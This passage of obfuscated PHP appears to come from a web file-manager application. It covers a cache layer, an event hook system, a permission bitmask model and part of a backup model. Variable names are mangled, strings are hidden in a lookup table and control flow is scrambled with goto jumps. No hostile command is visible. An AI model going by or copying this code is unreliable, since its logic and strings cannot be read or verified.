Model($_SERVER[´Ù×Íå‘ÄõÛ][719])->where($c‚ŒÚ… ¼±)->sum($_SERVER[´Ù×Íå‘ÄõÛ][77]); $Dº«Œ°Ñô½ = new TaskFileTransfer($_SERVER[´Ù×Íå‘ÄõÛ][737], $_SERVER[´Ù×Íå‘ÄõÛ][714], $Bó¬‡¿ÎÍ, LNG($_SERVER[´Ù×Íå‘ÄõÛ][715]) . $_SERVER[´Ù×Íå‘ÄõÛ][716] . LNG($_SERVER[´Ù×Íå‘ÄõÛ][738])); goto cùÉš·©Ä­; e‰…ò¯˜Õì: } private function _fileExist($d¾¬ˆÑÊÈ, &$dÜô˜¤‹ô‹, $dÃºº¿ÅŸ‘) { goto f´ œÑÖƒ; AÃ¬¸’ÇŞÇ: if (!in_array($d¾¬ˆÑÊÈ[$AİÑ¯ñ¦Ìğ[744]], $dÃºº¿ÅŸ‘)) { return !1; } if (IO::exist($eÑÍÓªçÅ)) { return !0; } $aïÈƒÇìÖ = get_path_father($eÑÍÓªçÅ); goto céÏ¿“±¢÷; f´ œÑÖƒ: $AİÑ¯ñ¦Ìğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÑÍÓªçÅ = $d¾¬ˆÑÊÈ[$AİÑ¯ñ¦Ìğ[75]]; if (in_array($d¾¬ˆÑÊÈ[$AİÑ¯ñ¦Ìğ[419]], $dÜô˜¤‹ô‹)) { return !1; } goto AÃ¬¸’ÇŞÇ; céÏ¿“±¢÷: if (IO::exist($aïÈƒÇìÖ)) { $dÜô˜¤‹ô‹[] = $d¾¬ˆÑÊÈ[$AİÑ¯ñ¦Ìğ[419]]; return !1; } $d—ãø˜¸ö‘ = array($AİÑ¯ñ¦Ìğ[744] => $d¾¬ˆÑÊÈ[$AİÑ¯ñ¦Ìğ[744]], $AİÑ¯ñ¦Ìğ[75] => array($AİÑ¯ñ¦Ìğ[752], "{$aïÈƒÇìÖ}\45")); $fá®Åİ†¿ = Model($AİÑ¯ñ¦Ìğ[719])->where($d—ãø˜¸ö‘)->field($AİÑ¯ñ¦Ìğ[420])->select(); goto D“¯±òùÛ; D“¯±òùÛ: $dÜô˜¤‹ô‹ = array_merge($dÜô˜¤‹ô‹, array_to_keyvalue($fá®Åİ†¿, $AİÑ¯ñ¦Ìğ[33], $AİÑ¯ñ¦Ìğ[419])); return !1; goto BÔâÕÎ‚ç¥; BÔâÕÎ‚ç¥: } private function _fileFilter($dìƒªñÔÌ) { $a¢ƒ¾Õ†é =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($dìƒªñÔÌ)) { return; } $CÈ—™©Ø³î = array($a¢ƒ¾Õ†é[419] => array($a¢ƒ¾Õ†é[7], array_unique($dìƒªñÔÌ))); $A„™—Ñ– = Model($a¢ƒ¾Õ†é[753])->where($CÈ—™©Ø³î)->field($a¢ƒ¾Õ†é[369])->select(); foreach ($A„™—Ñ– as $cãĞ‹±©¢×) { Model($a¢ƒ¾Õ†é[753])->remove($cãĞ‹±©¢×[$a¢ƒ¾Õ†é[369]], !1); } } private function storeIds() { $f¥§Î‰µÍÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AàÀñÄĞš˜ = Model($f¥§Î‰µÍÓ[704])->listData(); $Bƒ°Í‡ŸÑ = array(); $CÑ‹¦Ëì‹· = $GLOBALS[$f¥§Î‰µÍÓ[6]][$f¥§Î‰µÍÓ[84]][$f¥§Î‰µÍÓ[754]]; foreach ($AàÀñÄĞš˜ as $cÀƒİ·ó) { $CÎÚŠ„¶¥¥ = strtolower($cÀƒİ·ó[$f¥§Î‰µÍÓ[90]]); if (!isset($CÑ‹¦Ëì‹·[$CÎÚŠ„¶¥¥])) { continue; } $DÜ‡–‹° ½ = $f¥§Î‰µÍÓ[71] . (isset($CÑ‹¦Ëì‹·[$CÎÚŠ„¶¥¥]) ? $CÑ‹¦Ëì‹·[$CÎÚŠ„¶¥¥] : ucfirst($CÎÚŠ„¶¥¥)); if (!class_exists($DÜ‡–‹° ½)) { continue; } $Bƒ°Í‡ŸÑ[] = $cÀƒİ·ó[$f¥§Î‰µÍÓ[367]]; } return $Bƒ°Í‡ŸÑ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto CÈÓì†ğÒ; C±±Ä‚«Ø: switch ($CÊîŠØ£›«[$Bè“¤àÛì[755]]) { case $Bè“¤àÛì[17]: self::$handle = Model($Bè“¤àÛì[757]); break; case $Bè“¤àÛì[758]: self::$handle = new CacheRedis($Bè¸¥»«Ú¥, $bä†«ª›™¦); break; case $Bè“¤àÛì[759]: self::$handle = new CacheMemcached($Bè¸¥»«Ú¥, $bä†«ª›™¦); break; case $Bè“¤àÛì[167]: self::$handle = new CacheFile($Bè¸¥»«Ú¥, $bä†«ª›™¦); break; default: break; } return self::$handle; goto bò›ñ¬áµÌ; CÈÓì†ğÒ: $Bè“¤àÛì =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cğº‚ŞĞ; cğº‚ŞĞ: $CÊîŠØ£›« = $GLOBALS[$Bè“¤àÛì[6]][$Bè“¤àÛì[337]]; $Bè¸¥»«Ú¥ = $CÊîŠØ£›«[$CÊîŠØ£›«[$Bè“¤àÛì[755]]]; $bä†«ª›™¦ = $CÊîŠØ£›«[$Bè“¤àÛì[756]]; goto C±±Ä‚«Ø; bò›ñ¬áµÌ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Bğ½ˆ‡šãõ) { if (is_array($Bğ½ˆ‡šãõ) || is_object($Bğ½ˆ‡šãõ)) { $Bğ½ˆ‡šãõ = json_encode($Bğ½ˆ‡šãõ); } $Bğ½ˆ‡šãõ = rawurlencode($Bğ½ˆ‡šãõ); return KOD_SITE_ID . $_SERVER[´Ù×Íå‘ÄõÛ][70] . $Bğ½ˆ‡šãõ; } public static function get($CÌ‚–îáËä) { $f“É‰íá·ø = self::key($CÌ‚–îáËä); if (!isset(self::$memoryCache[$f“É‰íá·ø])) { $Dì¿Ïƒ”â¤ = self::init()->get($f“É‰íá·ø); self::$memoryCache[$f“É‰íá·ø] = unserialize($Dì¿Ïƒ”â¤); } return self::$memoryCache[$f“É‰íá·ø]; } public static function set($f‚¸ñò“Æª, $cÕë÷’å¸, $EŞÂóçÀÔ = false) { goto e›‘òØã; e›‘òØã: $eœìà’÷Â¢ = self::key($f‚¸ñò“Æª); if (isset(self::$memoryCache[$eœìà’÷Â¢]) && self::$memoryCache[$eœìà’÷Â¢] === $cÕë÷’å¸) { return !0; } if ($EŞÂóçÀÔ === 0) { self::$memoryCache[$eœìà’÷Â¢] = $cÕë÷’å¸; return !0; } goto Cñ™ÅÊë­Ø; b‰ãå„ä¬: CacheLock::unlock($f‚¸ñò“Æª); return $aò¡ôÜŒÙ–; goto EğÌÆÌĞÂÄ; Cñ™ÅÊë­Ø: CacheLock::lock($f‚¸ñò“Æª); $aò¡ôÜŒÙ– = self::init()->set($eœìà’÷Â¢, serialize($cÕë÷’å¸), $EŞÂóçÀÔ); self::$memoryCache[$eœìà’÷Â¢] = $cÕë÷’å¸; goto b‰ãå„ä¬; EğÌÆÌĞÂÄ: } public static function remove($E£ÆÏ‘ä³¿) { goto aò›™Ü¯â; Dê°â²’ò: CacheLock::lock($E£ÆÏ‘ä³¿); $A°Îğ½§ğÈ = self::init()->remove($AÅÓèë÷Æ¶); CacheLock::unlock($E£ÆÏ‘ä³¿); goto fš×ÀáÓÃ¿; fš×ÀáÓÃ¿: return $A°Îğ½§ğÈ; goto fõµ×‹¦½â; aò›™Ü¯â: $AÅÓèë÷Æ¶ = self::key($E£ÆÏ‘ä³¿); unset(self::$memoryCache[$AÅÓèë÷Æ¶]); self::clearTimeout(); goto Dê°â²’ò; fõµ×‹¦½â: } public static function clearMemory($FÉË˜¦É§Œ = false) { if ($FÉË˜¦É§Œ) { $FÉË˜¦É§Œ = self::key($FÉË˜¦É§Œ); unset(self::$memoryCache[$FÉË˜¦É§Œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[´Ù×Íå‘ÄõÛ][760])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[´Ù×Íå‘ÄõÛ][761])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($cÉÚÉ˜¡‡ˆ, $E‘ª×“­Ç) { $F½Ø¨¿ÃÉ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->cachePath = $cÉÚÉ˜¡‡ˆ[$F½Ø¨¿ÃÉ‚[75]]; $this->prefix = $F½Ø¨¿ÃÉ‚[762]; $this->cacheTime = $E‘ª×“­Ç; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cîÌ§ÎÆââ) { $C³¶ÑËÅèù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cîÌ§ÎÆââ = str_replace(array($C³¶ÑËÅèù[763], $C³¶ÑËÅèù[93], $C³¶ÑËÅèù[69]), $C³¶ÑËÅèù[764], $cîÌ§ÎÆââ); return $this->cachePath . $C³¶ÑËÅèù[765] . $cîÌ§ÎÆââ . $C³¶ÑËÅèù[766]; } public function set($F¾“‹Ø‚ß, $E÷ÁºÑ²”, $A¡¨Æ×µÛó = false) { $DªÂ¦½»–Ğ = $this->getFile($F¾“‹Ø‚ß); if (file_put_contents($DªÂ¦½»–Ğ, $this->prefix . $E÷ÁºÑ²”, LOCK_EX)) { return !0; } @unlink($DªÂ¦½»–Ğ); return !1; } public function get($bœ¶‹İóÍÎ) { $b×Œìœ¦Èí = $this->getFile($bœ¶‹İóÍÎ); if (file_exists($b×Œìœ¦Èí) && filemtime($b×Œìœ¦Èí) < time() - $this->cacheTime) { @unlink($b×Œìœ¦Èí); return !1; } $dĞ †Œ¤â£ = @file_get_contents($b×Œìœ¦Èí); return substr($dĞ †Œ¤â£, strlen($this->prefix)); } public function remove($d§Ë…É«) { $B°“Š¦õ¸¶ = $this->getFile($d§Ë…É«); return @unlink($B°“Š¦õ¸¶); } public function deleteAll() { $AšŒÑ°³Ÿ¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bñÑ’“îæ³ = scandir($this->cachePath); foreach ($bñÑ’“îæ³ as $AËçº„Íë¯) { $BŠÂäÖÔ… = $this->cachePath . $AËçº„Íë¯; if (strpos($BŠÂäÖÔ…, $AšŒÑ°³Ÿ¥[766]) && strpos($BŠÂäÖÔ…, $AšŒÑ°³Ÿ¥[767])) { @unlink($BŠÂäÖÔ…); } } } public function clearTimeout() { $eŸ¶æìïã® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÑ‘¾†³÷ = scandir($this->cachePath); foreach ($fÑ‘¾†³÷ as $F ‹ƒ¹Ù¯’) { $E¤—Œ¾±¢ = $this->cachePath . $F ‹ƒ¹Ù¯’; if (strpos($E¤—Œ¾±¢, $eŸ¶æìïã®[766]) && strpos($E¤—Œ¾±¢, $eŸ¶æìïã®[767]) && filemtime($E¤—Œ¾±¢) < time() - $this->cacheTime) { @unlink($E¤—Œ¾±¢); } } } } goto cìÎÈæ®İä; F›äèÂ¤‚: function beforeShutdownFatalError($c²ÂÁ„‡¹—) { think_exception($c²ÂÁ„‡¹—); } $_SERVER[$_SERVER[ïÚûó†Îá][45]] = $bß¾á†¡ó¦($_SERVER[$_SERVER[ïÚûó†Îá][42]]); $a¬§ëâ°¦‰ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto fĞãÑ®³º³; fŸ–ÉÂâÒ’: function exif_read_data_io($D´ ŒµöÏ¤, $e¥Ó„ôŒ÷ = null, $f¡İŸ©ô = false, $A¢”åš‰‰ = false) { $dÁµ³ã®ò = StreamWrapperIO::read($D´ ŒµöÏ¤, 0, 1024 * 64); $aŒêËÜœ¿† = $_SERVER[´Ù×Íå‘ÄõÛ][1755] . base64_encode($dÁµ³ã®ò); return exif_read_data($aŒêËÜœ¿†, $e¥Ó„ôŒ÷, $f¡İŸ©ô, $A¢”åš‰‰); } function getimagesize_io($BÑèæÉìšÖ, &$FŸÊ¨òî› = false) { $Fà¿Ü‡­‰ = StreamWrapperIO::read($BÑèæÉìšÖ, 0, 1024 * 64); $BÑèæÉìšÖ = $_SERVER[´Ù×Íå‘ÄõÛ][1755] . base64_encode($Fà¿Ü‡­‰); return getimagesize($BÑèæÉìšÖ, $FŸÊ¨òî›); } class Hook { private static $events = array(); public static function get($eçâÀÀ¬¹Ì = false) { if (!$eçâÀÀ¬¹Ì) { return self::$events; } else { return self::$events[$eçâÀÀ¬¹Ì]; } } public static function apply($EŸÆ…¯íöñ, $eŞ—ê”ò‹ = array()) { $fÈìß…ç„º = ActionApply($EŸÆ…¯íöñ, $eŞ—ê”ò‹); if (is_string($EŸÆ…¯íöñ)) { Hook::trigger($EŸÆ…¯íöñ); } return $fÈìß…ç„º; } public static function bind($B®³ˆÑÏ, $FÍîÅ…®ä½, $d·ñåí™Ò = false) { $dÓ×ì™¶¨´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset(self::$events[$B®³ˆÑÏ])) { self::$events[$B®³ˆÑÏ] = array(); } self::$events[$B®³ˆÑÏ][] = array($dÓ×ì™¶¨´[1756] => $FÍîÅ…®ä½, $dÓ×ì™¶¨´[1757] => $d·ñåí™Ò, $dÓ×ì™¶¨´[1758] => 0); } public static function once($A•òµ‡Ş¢Ä, $e£¶éÙÆ¥) { self::bind($A•òµ‡Ş¢Ä, $e£¶éÙÆ¥, !0); } public static function unbind($fàÎ§º¿˜, $Bóè¸·ë¾ò = false) { if (!$Bóè¸·ë¾ò) { self::$events[$fàÎ§º¿˜] = array(); return; } $C±×«â“øÕ = self::$events[$fàÎ§º¿˜]; self::$events[$fàÎ§º¿˜] = array(); if (!is_array($C±×«â“øÕ)) { return; } for ($d‚ô¼ÉÖ„… = 0; $d‚ô¼ÉÖ„… < count($C±×«â“øÕ); $d‚ô¼ÉÖ„…++) { if ($C±×«â“øÕ[$d‚ô¼ÉÖ„…][$_SERVER[´Ù×Íå‘ÄõÛ][1756]] == $Bóè¸·ë¾ò) { continue; } self::$events[$fàÎ§º¿˜][] = $C±×«â“øÕ[$d‚ô¼ÉÖ„…]; } } public static function filter($FÖŒ´Î˜¥”, $Añ‘Ì›¬») { goto Bù†‘Ï¦Ëœ; FÜ¯ó†ˆÔì: for ($cğÄ–ÖÇŠá = 0; $cğÄ–ÖÇŠá < count($dê›ÖœõÌ); $cğÄ–ÖÇŠá++) { $FœŞ÷”ÔÁ = $dê›ÖœõÌ[$cğÄ–ÖÇŠá]; if ($FœŞ÷”ÔÁ[$Cò†…Ìè¦Ö[1757]] && $FœŞ÷”ÔÁ[$Cò†…Ìè¦Ö[1758]] > 1) { continue; } self::$events[$FÖŒ´Î˜¥”][$cğÄ–ÖÇŠá][$Cò†…Ìè¦Ö[1758]] = $FœŞ÷”ÔÁ[$Cò†…Ìè¦Ö[1758]] + 1; $dù‘‚ŒõÅÇ = self::apply($FœŞ÷”ÔÁ[$Cò†…Ìè¦Ö[1756]], array($D¡ƒÙ”éË»)); if (gettype($dù‘‚ŒõÅÇ) == gettype($D¡ƒÙ”éË»)) { $D¡ƒÙ”éË» = $dù‘‚ŒõÅÇ; } } return $D¡ƒÙ”éË»; goto Aš—¤Ïßƒ; DÏ½øâ…âÒ: $dê›ÖœõÌ = $D‰Ê¨¨††ç[$FÖŒ´Î˜¥”]; $D¡ƒÙ”éË» = $Añ‘Ì›¬»; if (!is_array($dê›ÖœõÌ) || count($dê›ÖœõÌ) == 0) { return $D¡ƒÙ”éË»; } goto FÜ¯ó†ˆÔì; Bù†‘Ï¦Ëœ: $Cò†…Ìè¦Ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‰Ê¨¨††ç = self::$events; if (!isset($D‰Ê¨¨††ç[$FÖŒ´Î˜¥”])) { return $Añ‘Ì›¬»; } goto DÏ½øâ…âÒ; Aš—¤Ïßƒ: } public static function trigger($BÚ•ºÔ¯Á) { goto fŞ†«ï…‘¥; eöØ«ëÀ‘: return $e‚¼¬à¸´; goto bÓ’—¸¸Õ„; DĞÈÖ—´Ë: if (!isset($D±Ä Ğ»ÄÔ[$BÚ•ºÔ¯Á])) { return $e‚¼¬à¸´; } $BéÈĞÎçÇ£ = $D±Ä Ğ»ÄÔ[$BÚ•ºÔ¯Á]; if (!is_array($BéÈĞÎçÇ£) || count($BéÈĞÎçÇ£) == 0) { return $e‚¼¬à¸´; } goto Bİ§¬éÌ²; fŞ†«ï…‘¥: $E–½¿Íó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D±Ä Ğ»ÄÔ = self::$events; $e‚¼¬à¸´ = !1; goto DĞÈÖ—´Ë; Bİ§¬éÌ²: $B£²ÌÂÂ = func_get_args(); array_shift($B£²ÌÂÂ); for ($c¸¡Ö¶©å’ = 0; $c¸¡Ö¶©å’ < count($BéÈĞÎçÇ£); $c¸¡Ö¶©å’++) { $A¯â±çŒî† = $BéÈĞÎçÇ£[$c¸¡Ö¶©å’]; if ($A¯â±çŒî†[$E–½¿Íó[1757]] && $A¯â±çŒî†[$E–½¿Íó[1758]] > 1) { continue; } if (defined($E–½¿Íó[1759]) && GLOBAL_LOG_HOOK) { write_log($BÚ•ºÔ¯Á . $E–½¿Íó[1760] . $A¯â±çŒî†[$E–½¿Íó[1756]], $E–½¿Íó[1761]); } self::$events[$BÚ•ºÔ¯Á][$c¸¡Ö¶©å’][$E–½¿Íó[1758]] = $A¯â±çŒî†[$E–½¿Íó[1758]] + 1; $BçÆŸ„Ğİ„ = self::apply($A¯â±çŒî†[$E–½¿Íó[1756]], $B£²ÌÂÂ); if (defined($E–½¿Íó[1759]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $E–½¿Íó[1761]); if ($A¯â±çŒî†[$E–½¿Íó[1758]] == 200) { $b£ğİ‘ÕåŒ = is_array($A¯â±çŒî†[$E–½¿Íó[1756]]) ? json_encode_force($A¯â±çŒî†[$E–½¿Íó[1756]]) : $A¯â±çŒî†[$E–½¿Íó[1756]]; write_log($E–½¿Íó[1762] . $BÚ•ºÔ¯Á . $E–½¿Íó[1763] . $b£ğİ‘ÕåŒ, $E–½¿Íó[1764]); } } $e‚¼¬à¸´ = is_null($BçÆŸ„Ğİ„) ? $e‚¼¬à¸´ : $BçÆŸ„Ğİ„; } goto eöØ«ëÀ‘; bÓ’—¸¸Õ„: } } goto Cê‰‘†á; Dˆ¨¸öØ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $Fàåà’ñÆ‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C’‘ñİ±« = array(array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2113]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2115], $Fàåà’ñÆ‡[2116] => 6, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2119]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2120], $Fàåà’ñÆ‡[2116] => 1, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2121]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2122], $Fàåà’ñÆ‡[2116] => 2, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2123]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2122], $Fàåà’ñÆ‡[2116] => 3, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2124]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2125], $Fàåà’ñÆ‡[2116] => 4, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_VIEW), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2126]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2127], $Fàåà’ñÆ‡[2116] => 5, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Fàåà’ñÆ‡[386] => LNG($Fàåà’ñÆ‡[2128]), $Fàåà’ñÆ‡[2114] => $Fàåà’ñÆ‡[2129], $Fàåà’ñÆ‡[2116] => 7, $Fàåà’ñÆ‡[2117] => 1, $Fàåà’ñÆ‡[2118] => 0)); return $C’‘ñİ±«; } public static function authCheck($F‚ç²«ôöŸ, $AÌ£¡±®ëÓ) { $F‚ç²«ôöŸ = intval($F‚ç²«ôöŸ); if (_get($GLOBALS, $_SERVER[´Ù×Íå‘ÄõÛ][459])) { return !0; } if ($F‚ç²«ôöŸ <= 0) { return !1; } if (($F‚ç²«ôöŸ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($F‚ç²«ôöŸ & $AÌ£¡±®ëÓ); } public static function authCheckShow($bİÒÊŠ–ôÊ) { return self::authCheck($bİÒÊŠ–ôÊ, self::AUTH_SHOW); } public static function authCheckView($bİå›Éğ÷À) { return self::authCheck($bİå›Éğ÷À, self::AUTH_VIEW); } public static function authCheckDownload($EËÓÈ°ö¨‘) { return self::authCheck($EËÓÈ°ö¨‘, self::AUTH_DOWNLOAD); } public static function authCheckUpload($b×ªÜö¹ÈÎ) { return self::authCheck($b×ªÜö¹ÈÎ, self::AUTH_UPLOAD); } public static function authCheckEdit($e÷®‘¶›î) { return self::authCheck($e÷®‘¶›î, self::AUTH_EDIT); } public static function authCheckRemove($F…ø½¢¼ËÍ) { return self::authCheck($F…ø½¢¼ËÍ, self::AUTH_REMOVE); } public static function authCheckShare($d£¸º”È¶‰) { return self::authCheck($d£¸º”È¶‰, self::AUTH_SHARE); } public static function authCheckComment($D½Èšñ½·) { return self::authCheck($D½Èšñ½·, self::AUTH_COMMENT); } public static function authCheckEvent($EÔ§ùÙ«®¦) { return self::authCheck($EÔ§ùÙ«®¦, self::AUTH_EVENT); } public static function authCheckRoot($C©„Ù›ë›¾) { return self::authCheck($C©„Ù›ë›¾, self::AUTH_ROOT); } public static function authDisable($FíÕ £Û®ê, $E‰Ğšãïª‚) { if (intval($FíÕ £Û®ê) <= 0) { return 0; } return intval($FíÕ £Û®ê) & ~$E‰Ğšãïª‚; } public $optionType = "\x53\171\x73\x74\145\x6d\56\163\x6f\165\162\143\x65\101\x75\x74\x68\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\165\164\x68", "\x6c\x61\x62\x65\x6c", "\144\x69\163\160\x6c\141\x79", "\163\x79\163\164\145\155", "\x73\x6f\162\x74"); public function initData() { $c­‘ÒŠ±Ü = $this->authDefault(); foreach ($c­‘ÒŠ±Ü as $f¶Õ«¢’÷) { $this->add($f¶Õ«¢’÷); } } public function listData($Fº…‡Ö¡ = false, $BáÎ•™ç©ê = "\x73\x6f\x72\x74", $eôĞá“—ó = false) { return parent::listData($Fº…‡Ö¡, $BáÎ•™ç©ê, $eôĞá“—ó); } public function update($Câ»âñ¨Ô‹, $C¼†ÙÔç) { $cÑœÅµ…ĞÁ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fß„¿ƒñøÄ = parent::listData($Câ»âñ¨Ô‹); $Aµ¼Óƒ§ó = $this->findByName($C¼†ÙÔç[$cÑœÅµ…ĞÁ[28]]); if (!$fß„¿ƒñøÄ || $Aµ¼Óƒ§ó && $Aµ¼Óƒ§ó[$cÑœÅµ…ĞÁ[367]] != $fß„¿ƒñøÄ[$cÑœÅµ…ĞÁ[367]]) { return !1; } $this->filterAuth($C¼†ÙÔç[$cÑœÅµ…ĞÁ[376]]); return parent::update($Câ»âñ¨Ô‹, $C¼†ÙÔç); } public function remove($CğïáÜ„ù‘) { $AËñÛÅÆèÖ = parent::listData($CğïáÜ„ù‘); if (!$AËñÛÅÆèÖ || $AËñÛÅÆèÖ[$_SERVER[´Ù×Íå‘ÄõÛ][1084]]) { return !1; } return parent::remove($CğïáÜ„ù‘); } public function add($a³ŠÕ«´› = array()) { goto CÒ®÷‚å‹Á; CÒ®÷‚å‹Á: $cŞ„ëÕ¬Áˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->findByName($a³ŠÕ«´›[$cŞ„ëÕ¬Áˆ[28]])) { return !1; } $c¾×¸´øŞ¦ = array($cŞ„ëÕ¬Áˆ[28] => $cŞ„ëÕ¬Áˆ[33], $cŞ„ëÕ¬Áˆ[376] => 1, $cŞ„ëÕ¬Áˆ[2130] => $cŞ„ëÕ¬Áˆ[2131], $cŞ„ëÕ¬Áˆ[2132] => 1, $cŞ„ëÕ¬Áˆ[1084] => 0, $cŞ„ëÕ¬Áˆ[2133] => 0); goto Cïï„ÙÔ®‰; bÇ‹µµ×ƒ: return parent::insert($a³ŠÕ«´›); goto a‡ÉÉŸõ´œ; Cïï„ÙÔ®‰: $a³ŠÕ«´› = array_merge($c¾×¸´øŞ¦, $a³ŠÕ«´›); $a³ŠÕ«´›[$cŞ„ëÕ¬Áˆ[2133]] = $this->getSort(); $this->filterAuth($a³ŠÕ«´›[$cŞ„ëÕ¬Áˆ[376]]); goto bÇ‹µµ×ƒ; a‡ÉÉŸõ´œ: } private function getSort() { $bÅï’Œ’Â¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d…Ì˜÷µÓ© = parent::listData(); $EªÄ‚¼·•ì = array_to_keyvalue($d…Ì˜÷µÓ©, $bÅï’Œ’Â¡[33], $bÅï’Œ’Â¡[2133]); return empty($EªÄ‚¼·•ì) ? 0 : max($EªÄ‚¼·•ì) + 1; } private function filterAuth(&$dòÁ°ôôºÂ) { goto fÓÚ§‰Ü¯Æ; e©À©ÄÕ”Ò: foreach ($cŸÔçÕ«‘ as $B÷¯–ŸœË×) { if (isset($D¸æ“àî¼ö[$B÷¯–ŸœË×])) { $cŸÔçÕ«‘ = array_merge($cŸÔçÕ«‘, $D¸æ“àî¼ö[$B÷¯–ŸœË×]); } } $cŸÔçÕ«‘[] = self::AUTH_SHOW; $dòÁ°ôôºÂ = array_sum(array_unique($cŸÔçÕ«‘)); goto eÀ¼ã±Ÿ­ç; fÓÚ§‰Ü¯Æ: if (!$dòÁ°ôôºÂ) { return; } $AëƒîÃƒÃã = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $cŸÔçÕ«‘ = array(); goto F°ÒºİºÜ‹; F°ÒºİºÜ‹: foreach ($AëƒîÃƒÃã as $B÷¯–ŸœË×) { if ($dòÁ°ôôºÂ & $B÷¯–ŸœË×) { $cŸÔçÕ«‘[] = $B÷¯–ŸœË×; } } if (in_array(self::AUTH_ROOT, $cŸÔçÕ«‘)) { $dòÁ°ôôºÂ = array_sum($AëƒîÃƒÃã); return; } $D¸æ“àî¼ö = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e©À©ÄÕ”Ò; eÀ¼ã±Ÿ­ç: } public function sort($FÔ…æ–¹ã®, $FÀ‰êŸ›‘ç) { return parent::update($FÔ…æ–¹ã®, $FÀ‰êŸ›‘ç); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x62\141\x63\x6b\165\160\114\151\x73\164"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\x73\164\x61\164\x75\163", "\x63\x6f\156\x74\x65\x6e\x74", "\x72\x65\163\x75\154\x74", "\x74\151\x6d\x65\106\162\157\155", "\164\x69\x6d\x65\124\157"); public function config() { goto aæÑ ¸ÊŞä; aæÑ ¸ÊŞä: $a‘¦Ñ¶Õ«ø =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F†Ê®­É°Ä = Model($a‘¦Ñ¶Õ«ø[1092])->get($a‘¦Ñ¶Õ«ø[714]); $F†Ê®­É°Ä = json_decode($F†Ê®­É°Ä, !0); goto BâŒ¾ƒŒ¾; 